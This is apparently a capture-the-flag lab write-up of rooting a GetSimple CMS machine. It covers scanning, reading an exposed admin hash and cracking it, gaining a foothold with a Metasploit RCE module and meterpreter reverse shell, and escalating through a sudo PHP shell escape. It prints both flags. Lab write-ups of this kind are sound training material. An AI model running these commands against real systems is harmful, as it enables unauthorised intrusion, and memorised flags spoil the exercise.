**Date:** 2026-04-05 
**Category:** #CMS_Exploitation / #Information_Leakage / #GTFOBins 
**Target IP:** `10.129.46.76` 
**Status:** **Rooted ✅**

---

## 🔍 Phase 1: External Enumeration

> **Objective:** Map the web application structure and identify sensitive data exposure.

### 🛠️ Execution & Intelligence

1. **Service Discovery:** `nmap -p- --min-rate 5000 10.129.46.76`
    
    - **Result:** Port 22 (SSH) and 80 (HTTP) open.
        
2. **Web Profiling:** `whatweb 10.129.46.76` identified **GetSimple CMS**.
    
3. **Directory Fuzzing:** `gobuster` identified several sensitive directories:
    
    - `/admin/` (Management portal)
        
    - `/data/` (Application data - **Directory Listing Enabled**)
        

---

## 🔑 Phase 2: Information Leakage & Auth

> **Objective:** Bypass authentication by leveraging exposed configuration files.

1. **The Leak:** Navigated to `http://10.129.46.76/data/users/admin.xml`.
    
2. **The Hash:** Extracted the SHA1 hash for the `admin` user: `d033e22ae348aeb566...`
    
3. **Cracking:** The hash decrypted to the weak password `admin`.
    
4. **Access:** Authenticated to the CMS dashboard. **Version identified: 3.3.15.**
    

---

## 🐚 Phase 3: Initial Foothold (Meterpreter)

> **Objective:** Utilize a known RCE vulnerability to gain an interactive OS shell.

### 🛠️ Metasploit Execution

1. **Module:** `exploit/multi/http/getsimplecms_unauth_code_exec`
    
2. **Payload:** `linux/x86/meterpreter/reverse_tcp`
    
3. **Flag Recovery:** * **User:** `mrb3n`
    
    - **🚩 User Flag:** `7002d65b149b0a4d19132a66feed21d8`
        

---

## 🪜 Phase 4: Vertical Privilege Escalation

> **Objective:** Escalate from `mrb3n` to `root` using binary misconfigurations.

### 🔍 Sudo Enumeration

The command `sudo -l` revealed a critical security hole:

- **Entry:** `(ALL : ALL) NOPASSWD: /usr/bin/php`
    

### 🛠️ The PHP Escape (GTFOBins)

Since PHP can execute system commands, running it with `sudo` allows for an immediate root shell:

Bash

```
sudo /usr/bin/php -r 'system("/bin/sh -i");'
```

### 🏁 Final Root Access

- **Verification:** `whoami` -> `root`
    
- **🚩 Root Flag:** `f1fba6e9f71efb2630e6e34da6387842`
    

---

## 🧠 Lessons Learned

- **Directory Listing:** Never ignore `/data/` or `/backup/` folders. Even if a login page is secure, the backend data storage might leak the keys to the kingdom.
    
- **Unauthenticated RCE:** Certain exploits can trigger before login. Always check **Exploit-DB** for the specific CMS version before spending time on brute-forcing.
    
- **GTFOBins Power:** If `sudo -l` shows a programming language (PHP, Python, Perl), the system is effectively compromised. These binaries have built-in "Escape" functions that bypass the restricted shell.